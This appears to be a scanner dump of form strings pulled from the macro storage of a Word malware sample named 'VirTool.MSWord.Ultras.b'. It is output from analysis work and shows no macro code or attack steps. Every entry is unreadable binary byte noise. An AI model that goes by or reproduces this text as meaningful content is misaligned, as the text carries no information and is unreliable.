VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S@@�������00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�࿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��ȿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=PPr00M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������JJK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ǐ��$$&'')++-������ttv99<<<?>>B���OOSEEIFFJSSV������������������<<?88;336..1))+##$������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ď��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V@@�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
叏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�῿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@@D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@X���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00����PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������III
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ǝ��!!"$$&((*������33566999<<<?���qqtCCGDDHEEI������������������;;?88;336}}������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���PPi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W@@�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�޿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�㿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���003
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
00I���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������GGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ō��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#%%'������00344677:::=���oorAAECCGDDH������������������;;?88;336���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�῿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�俿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��ҟ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r``�``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����EEF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ċ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ""$������..022455888<���nnq@@DBBFCCG������������������<<?88;447���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�⿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�濿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A��ҿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��ş��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��˿�����������DDD			
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^^^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !������,,.00344677:���nnp??CAAECCF������������������<<@99<558ddf������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�珏�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�@@׏���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϳ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:���������������������BBC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'')���������**-..1225669���mmp??BAAECCF������������������>>A::>77:225--0''*������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pp����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
޿�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
		
sss
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lPP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8���������������������AAA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RRS���������))+--0114558���mmo??BAAECCG������������������??C<<@99<447//2**,������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�����������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00����������
